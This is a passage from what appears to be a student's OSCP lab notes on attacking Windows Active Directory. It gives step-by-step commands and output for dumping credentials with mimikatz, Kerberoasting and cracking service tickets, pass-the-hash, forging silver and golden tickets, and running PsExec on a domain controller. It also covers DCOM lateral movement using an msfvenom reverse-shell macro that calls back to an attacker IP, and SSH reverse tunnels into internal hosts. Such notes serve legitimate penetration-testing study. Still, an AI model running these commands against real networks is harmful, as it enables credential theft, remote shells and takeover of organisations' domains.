		<span class="token function">Write-host</span> <span class="token string">&quot;SPN(&quot;</span> <span class="token variable">$i</span> <span class="token string">&quot;)   =      &quot;</span> <span class="token variable">$SPN</span>
		<span class="token variable">$i</span><span class="token operator">+=</span>1
	<span class="token punctuation">}</span>
	<span class="token function">Write-host</span> <span class="token string">&quot;&quot;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="mimikatz"><a href="#mimikatz" class="header-anchor">#</a> Mimikatz</h3> <h4 id="password-hashes"><a href="#password-hashes" class="header-anchor">#</a> Password Hashes</h4> <p>To get password hashes on windows, we can use <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreferrer">mimikatz<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>Then in mimikats:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>c:<span class="token punctuation">\</span>Tools<span class="token punctuation">\</span>active_directory<span class="token operator">&gt;</span>mimikatz.exe

  <span class="token builtin class-name">.</span><span class="token comment">#####.   mimikatz 2.1.1 (x86) built on Mar 25 2018 21:00:57</span>
 <span class="token builtin class-name">.</span><span class="token comment">## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)</span>
 <span class="token comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="token comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent.letoux@gmail.com <span class="token punctuation">)</span>
  <span class="token string">'#####'</span>        <span class="token operator">&gt;</span> http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz <span class="token comment"># privilege::debug</span>
Privilege <span class="token string">'20'</span> OK

mimikatz <span class="token comment"># sekurlsa::logonpasswords</span>
</code></pre></div><p>or</p> <div class="language-sh extra-class"><pre class="language-sh"><code>sekurlsa::minidump C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>%USERNAME%<span class="token punctuation">\</span>Documents<span class="token punctuation">\</span>lsass.DMP
</code></pre></div><h4 id="tickets-ticket-granting-ticket-ticket-granting-service"><a href="#tickets-ticket-granting-ticket-ticket-granting-service" class="header-anchor">#</a> Tickets [Ticket Granting Ticket / Ticket Granting Service]</h4> <p>TGT can request for TGS for resources wanted in domain</p> <div class="language-sh extra-class"><pre class="language-sh"><code>sekurlsa::tickets
</code></pre></div><h3 id="display-kerberos-service-ticket"><a href="#display-kerberos-service-ticket" class="header-anchor">#</a> Display kerberos service ticket</h3> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\Windows\system32&gt; <span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel
<span class="token function">PS</span> C:\Windows\system32&gt; <span class="token function">New-Object</span> System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">'HTTP/CorpWe
bServer.corp.com'</span>

Id                   : uuid-393f01fe-efad-46c9-a875-8ddc9eb96828-2
SecurityKeys         : <span class="token punctuation">{</span>System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>InMemorySymmetricSecurityKey<span class="token punctuation">}</span>
ValidFrom            : 5/29/2020 8:30:02 PM
ValidTo              : 5/30/2020 6:26:32 AM
ServicePrincipalName : HTTP/CorpWebServer<span class="token punctuation">.</span>corp<span class="token punctuation">.</span>com
SecurityKey          : System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>InMemorySymmetricSecurityKey

<span class="token comment"># can alternatively use klist command </span>
<span class="token function">PS</span> C:\Windows\system32&gt; klist

<span class="token comment"># or inside mimikatz to export into files to be downloaded to attack machine:</span>
mimikatz <span class="token comment"># kerberos::list /export</span>

<span class="token comment"># Or use Invoke-kerberoast</span>
<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Invoke-Kerberoast</span><span class="token punctuation">.</span>ps1
<span class="token function">Invoke-Kerberoast</span> <span class="token operator">-</span>OutputFormat john <span class="token punctuation">|</span> <span class="token function">Select-Object</span> <span class="token operator">-</span>ExpandProperty hash <span class="token punctuation">|</span><span class="token operator">%</span> <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">':$krb5tgs$23$'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
</code></pre></div><p>Now to crack service tickets to find clear-text passwords for service accounts</p> <div class="language-sh extra-class"><pre class="language-sh"><code>~/kerberoast<span class="token punctuation">(</span>master*<span class="token punctuation">)</span> » python3 tgsrepcrack.py rockyou-20.txt ~/OSCP-excercises/1-40a50000-offsec@HTTP<span class="token punctuation">\</span>~CorpWebServer.corp.com-CORP.COM.kirbi                              omar2535@kali


USE HASHCAT, IT'S HELLA FASTER<span class="token operator">!</span><span class="token operator">!</span>


Cracking <span class="token number">1</span> tickets<span class="token punctuation">..</span>.
found password <span class="token keyword">for</span> ticket <span class="token number">0</span>: Qwerty09<span class="token operator">!</span>  File: /home/omar2535/OSCP-excercises/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
Successfully cracked all tickets
</code></pre></div><h3 id="pass-the-hash"><a href="#pass-the-hash" class="header-anchor">#</a> Pass the Hash</h3> <p>Once the NTLM hash is retrieved, we can construct a pass the hash attack to elevate our priveleges using NTLM authentication.
For example, if our NTLM hash was <code>2892d26cdf84d7a70e2eb3b9f05c425e</code>, then our command to pass the hash would be</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token comment"># the following command will launch a rdesktop with that user's hash</span>
<span class="token comment"># the aad3b435b51404eeaad3b435b51404ee part after the userid means &quot;no password&quot;</span>
pth-winexe <span class="token parameter variable">-U</span> offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.194.10 cmd 

E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH<span class="token punctuation">..</span>.
Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.16299.15<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2017</span> Microsoft Corporation. All rights reserved.
C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>
</code></pre></div><h3 id="overpass-the-hash"><a href="#overpass-the-hash" class="header-anchor">#</a> Overpass the hash</h3> <p>We can bypass NTLM authentication and get a TGT by passing the hash within mimikats like so:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>mimikatz <span class="token comment"># sekurlsa::pth /user:jeff_admin /domain:corp.com /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe</span>
</code></pre></div><p>and a powershell is spawned. To check our kerberos tickets:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>&gt; klist
</code></pre></div><p>Now we can log into the domain controller using psexec like so:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\Tools\active_directory&gt; <span class="token punctuation">.</span>\PsExec<span class="token punctuation">.</span>exe \\dc01 cmd<span class="token punctuation">.</span>exe
</code></pre></div><h3 id="creating-a-silver-ticket-to-authenticate-with"><a href="#creating-a-silver-ticket-to-authenticate-with" class="header-anchor">#</a> Creating a silver ticket to authenticate with</h3> <p>First find the SID:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token function">PS</span> C:\Tools\active_directory&gt; whoami <span class="token operator">/</span>user

USER INFORMATION
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
<span class="token function">PS</span> C:\Tools\active_directory&gt; <span class="token punctuation">.</span>\mimikatz<span class="token punctuation">.</span>exe
</code></pre></div><p>Now purge all existing tickets</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>mimikatz <span class="token comment"># kerberos::purge</span>
mimikatz <span class="token comment"># kerberos::list</span>
</code></pre></div><p>Now create the new ticket with the sid's last portion cut off and the rc4 from the NTLM hash</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>mimikatz <span class="token comment"># kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt</span>
</code></pre></div><h3 id="distributed-component-object-model-pivoting"><a href="#distributed-component-object-model-pivoting" class="header-anchor">#</a> Distributed Component Object model (Pivoting)</h3> <p>We can launch applications on another computer from a workstation with microsoft office installed.</p> <p>First let's view the available methods and find if the <code>run</code> method is available.</p> <p>Ip addresss of remote workstation: 172.16.194.5</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token variable">$com</span> = <span class="token namespace">[activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgId<span class="token punctuation">(</span><span class="token string">&quot;Excel.Application&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;172.16.194.5&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token variable">$com</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span>
</code></pre></div><p>Now create the excel macro</p> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.194.10 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> vba-psh <span class="token operator">&gt;</span> new_payload.txt
<span class="token function">cat</span> new_payload.txt
</code></pre></div><p>copy it to the remote computer</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token variable">$LocalPath</span> = <span class="token string">&quot;C:\Users\jeff_admin\Documents\myexcel.xls&quot;</span>
<span class="token variable">$RemotePath</span> = <span class="token string">&quot;\\172.16.194.5\c$\myexcel.xls&quot;</span>
<span class="token namespace">[System.IO.File]</span>::<span class="token function">Copy</span><span class="token punctuation">(</span><span class="token variable">$LocalPath</span><span class="token punctuation">,</span> <span class="token variable">$RemotePath</span><span class="token punctuation">,</span> <span class="token boolean">$True</span><span class="token punctuation">)</span>
</code></pre></div><p>Now open the excel file from our machine by creating a system profile on the remote machine then running it</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token variable">$com</span> = <span class="token namespace">[activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgId<span class="token punctuation">(</span><span class="token string">&quot;Excel.Application&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;172.16.194.5&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token variable">$Path</span> = <span class="token string">&quot;\\172.16.194.5\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;</span>
<span class="token variable">$temp</span> = <span class="token namespace">[system.io.directory]</span>::createDirectory<span class="token punctuation">(</span><span class="token variable">$Path</span><span class="token punctuation">)</span>

<span class="token variable">$Workbook</span> = <span class="token variable">$com</span><span class="token punctuation">.</span>Workbooks<span class="token punctuation">.</span>Open<span class="token punctuation">(</span><span class="token string">&quot;C:\myexcel.xls&quot;</span><span class="token punctuation">)</span>

<span class="token variable">$com</span><span class="token punctuation">.</span>Run<span class="token punctuation">(</span><span class="token string">&quot;mymacro&quot;</span><span class="token punctuation">)</span>
<span class="token variable">$com</span><span class="token punctuation">.</span>Run<span class="token punctuation">(</span><span class="token string">&quot;Workbook_Open&quot;</span><span class="token punctuation">)</span>
<span class="token variable">$com</span><span class="token punctuation">.</span>Run<span class="token punctuation">(</span><span class="token string">&quot;mOaoZH8&quot;</span><span class="token punctuation">)</span>
<span class="token variable">$com</span><span class="token punctuation">.</span>Run<span class="token punctuation">(</span><span class="token string">&quot;AutoOpen&quot;</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="creating-a-golden-ticket-to-psexec-on-domain-controller"><a href="#creating-a-golden-ticket-to-psexec-on-domain-controller" class="header-anchor">#</a> Creating a golden ticket to psexec on domain controller</h3> <p>Go into the domain controller and grab the NTLM hash</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token comment"># On the domain controller:</span>
C:\Tools&gt;mimikatz<span class="token punctuation">.</span>exe

  <span class="token punctuation">.</span><span class="token comment">#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04</span>
 <span class="token punctuation">.</span><span class="token comment">## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)</span>
 <span class="token comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="token comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent<span class="token punctuation">.</span>letoux@gmail<span class="token punctuation">.</span>com <span class="token punctuation">)</span>
  <span class="token string">'#####'</span>        &gt; http:<span class="token operator">/</span><span class="token operator">/</span>pingcastle<span class="token punctuation">.</span>com <span class="token operator">/</span> http:<span class="token operator">/</span><span class="token operator">/</span>mysmartlogon<span class="token punctuation">.</span>com   <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">/</span>

mimikatz <span class="token comment"># privilege::debug</span>
Privilege <span class="token string">'20'</span> OK

mimikatz <span class="token comment"># lsadump::lsa /patch</span>

RID  : 000001f6 <span class="token punctuation">(</span>502<span class="token punctuation">)</span>
User : krbtgt
LM   :
NTLM : fc274a94b36874d2560a7bd332604fab
</code></pre></div><p>Now on the workstation:</p> <p>Find the SID first using <code>whoami /user</code> without the last part after the <code>-</code>.</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>C:\Tools&gt;mimikatz<span class="token punctuation">.</span>exe

  <span class="token punctuation">.</span><span class="token comment">#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04</span>
 <span class="token punctuation">.</span><span class="token comment">## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)</span>
 <span class="token comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="token comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent<span class="token punctuation">.</span>letoux@gmail<span class="token punctuation">.</span>com <span class="token punctuation">)</span>
  <span class="token string">'#####'</span>        &gt; http:<span class="token operator">/</span><span class="token operator">/</span>pingcastle<span class="token punctuation">.</span>com <span class="token operator">/</span> http:<span class="token operator">/</span><span class="token operator">/</span>mysmartlogon<span class="token punctuation">.</span>com   <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">/</span>

mimikatz <span class="token comment"># privilege::debug</span>
Privilege <span class="token string">'20'</span> OK

mimikatz <span class="token comment"># kerberos::purge</span>
Ticket<span class="token punctuation">(</span>s<span class="token punctuation">)</span> purge <span class="token keyword">for</span> current session is OK

mimikatz <span class="token comment"># kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt</span>
</code></pre></div><p>Now we can launch a command prompt on the domain controller using <code>psexec</code> like so:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>cd C:<span class="token punctuation">\</span>Tools<span class="token punctuation">\</span>active_directory

C:<span class="token punctuation">\</span>Tools<span class="token punctuation">\</span>active_directory<span class="token operator">&gt;</span>PsExec.exe <span class="token punctuation">\</span><span class="token punctuation">\</span>dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2001</span>-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.14393<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2016</span> Microsoft Corporation. All rights reserved.

C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>whoami
corp<span class="token punctuation">\</span>fakeuser
</code></pre></div><h2 id="password-cracking"><a href="#password-cracking" class="header-anchor">#</a> Password cracking</h2> <h3 id="hash-identifier"><a href="#hash-identifier" class="header-anchor">#</a> Hash identifier</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>hash-identifier AAFDC23870ECBCD3D557B6423A8982134E17927E
</code></pre></div><h2 id="wordpress-scanning"><a href="#wordpress-scanning" class="header-anchor">#</a> Wordpress scanning</h2> <p>The following command saves the output to a file <code>sandbox-wpscan</code></p> <div class="language-sh extra-class"><pre class="language-sh"><code>wpscan <span class="token parameter variable">--url</span> sandbox.local <span class="token parameter variable">--enumerate</span> ap,at,cb,dbe <span class="token parameter variable">-o</span> sandbox-wpscan <span class="token parameter variable">-f</span> cli-no-color
</code></pre></div><h2 id="tunneling"><a href="#tunneling" class="header-anchor">#</a> Tunneling</h2> <h3 id="ssh-tunnel"><a href="#ssh-tunnel" class="header-anchor">#</a> SSH tunnel</h3> <p>To create a tunnel with a middle-machine that can access both internal network and external network where the attacking machine's IP is <code>192.168.119.194</code> and the IP for the internal database is <code>10.5.5.11</code> (with ports 22 and 3306 open) and the remote machine's IP is <code>10.11.1.250</code></p> <p>On the remote machine, run either:</p> <ol><li>Interactive (allows for password entering)<div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">ssh</span> <span class="token parameter variable">-R</span> <span class="token number">1122</span>:10.5.5.11:22 <span class="token parameter variable">-R</span> <span class="token number">13306</span>:10.5.5.11:3306 <span class="token parameter variable">-o</span> <span class="token string">&quot;UserKnownHostsFile=/dev/null&quot;</span> <span class="token parameter variable">-o</span> <span class="token string">&quot;StrictHostKeyChecking=no&quot;</span> omar2535@192.168.119.194
</code></pre></div></li></ol> <p>or</p> <ol start="2"><li>Non-interactive (using SSH key)<div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">ssh</span> <span class="token parameter variable">-f</span> <span class="token parameter variable">-N</span> <span class="token parameter variable">-R</span> <span class="token number">1122</span>:10.5.5.11:22 <span class="token parameter variable">-R</span> <span class="token number">13306</span>:10.5.5.11:3306 <span class="token parameter variable">-o</span> <span class="token string">&quot;UserKnownHostsFile=/dev/null&quot;</span> <span class="token parameter variable">-o</span> <span class="token string">&quot;StrictHostKeyChecking=no&quot;</span> <span class="token parameter variable">-i</span> /tmp/keys/id_rsa omar2535@192.168.119.194
</code></pre></div></li></ol> <p>where the private key is on the tunnel machine and the public key given to the attacking machine:</p> <p><code>~/.ssh/authorized_keys</code></p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token assign-left variable">from</span><span class="token operator">=</span><span class="token string">&quot;10.11.1.250&quot;</span>,command<span class="token operator">=</span><span class="token string">&quot;echo 'Only port forwarding allowed'&quot;</span>,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94/<span class="token punctuation">..</span>.
</code></pre></div><p>and the ssh service is started using <code>systemctl start ssh.socket</code></p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/misc/Courses/PWK/buffer_overflow.html" class="prev">
        Buffer overflows
      </a></span> <span class="next"><a href="/misc/Courses/PWK/linux_privesc.html">
        Linux privilege escalation
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.e90b9e2c.js" defer></script><script src="/assets/js/2.53b2ba1e.js" defer></script><script src="/assets/js/1.cc48f7d2.js" defer></script><script src="/assets/js/56.4bdb98d5.js" defer></script>
  </body>
</html>
